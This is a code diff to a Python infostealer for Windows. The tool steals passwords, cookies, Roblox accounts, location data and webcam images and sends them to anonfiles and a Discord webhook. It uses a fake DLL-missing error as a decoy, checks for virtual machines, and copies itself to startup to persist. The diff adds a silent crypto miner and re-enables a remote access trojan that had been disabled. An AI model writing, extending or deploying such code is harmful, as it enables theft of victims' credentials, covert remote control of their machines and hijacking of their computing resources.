@@ -4,10 +4,12 @@ import informations
 import malicious
 import rose_rat
 import InjectX
+import knight_rat
 from startup import Startup
 import _roblox
 from config import Config
 from anonFile import uploadToAnonfiles
+from crypto_miner import miner
 ii = informations.Info()
 _webh = _webhook.WebhookX()
 cc = Config()
@@ -42,8 +44,9 @@ pygame.camera.init()
 if platform.system() != "Windows":
     sys.exit()
 
-if cc.get_start_up() is True:
-    Startup().copy_to_startup()
+if cc.get_start_up():
+    startup_instance = Startup()
+    startup_instance.copy_to_startup()
 
 ### FORCE REMOVED BY DEVELOPERS
 # if cc.get_disable_windows_defender() is True:
@@ -51,10 +54,10 @@ if cc.get_start_up() is True:
 # if cc.get_disable_windows_firewalls() is True:
 #     import disableFirewalls
 
-if cc.get_fake_error() is True:
+if cc.get_fake_error():
     ctypes.windll.user32.MessageBoxW(0, "The program can't start because VLg7.ll is missing from your computer. Try reinstalling the program to fix this problem", "DDL missing", 16)
 
-if cc.get_vmdetection() is True:
+if cc.get_vmdetection():
     import vmdetect
 
 
@@ -634,11 +637,11 @@ def GatherAll():
     global upths
     upths = []
 
-    if cc.get_password_stealing() is True:
+    if cc.get_password_stealing():
         upload("wppassw",
                uploadToAnonfiles(os.getenv("TEMP") + "\\wppassw.txt"))
 
-    if cc.get_cookie_stealing() is True:
+    if cc.get_cookie_stealing():
         upload("wpcook", uploadToAnonfiles(os.getenv("TEMP") + "\\wpcook.txt"))
 
 
@@ -845,7 +848,7 @@ if cc.get_webcam():
         }
         response = requests.post(webhook, json=ping)
         
-if cc.get_password_stealing() is True:
+if cc.get_password_stealing():
     wikith = Kiwi()
     for thread in wikith:
         thread.join()
@@ -867,21 +870,24 @@ if cc.get_password_stealing() is True:
     print(filetext)
     upload("kiwi", filetext)
 
-if cc.get_malicious_stealing() is True:
+if cc.get_malicious_stealing():
     send_malicious()
 
-if cc.get_injection() is True:
+if cc.get_injection():
     InjectX.InjectionX(webhook)
 
-if cc.get_roblox_stealing() is True:
+if cc.get_roblox_stealing():
     _roblox.RobloxX().run()
 
-if cc.get_location_stealing() is True:
+if cc.get_location_stealing():
     _webh.locations_webhook(ii.global_info())
 
-if cc.get_rose_discord_rat() is True:
+if cc.get_rose_discord_rat():
     rose_rat.run_rat()
+
+if cc.silent_crypto_miner():
+    miner.run_miner()
+
+if cc.get_knight_discord_rat():
+    knight_rat.run_rat()
     
-### FORCE REMOVED BY DEVELOPERS
-# if cc.get_knight_discord_rat() is True:
-#     import knight_rat
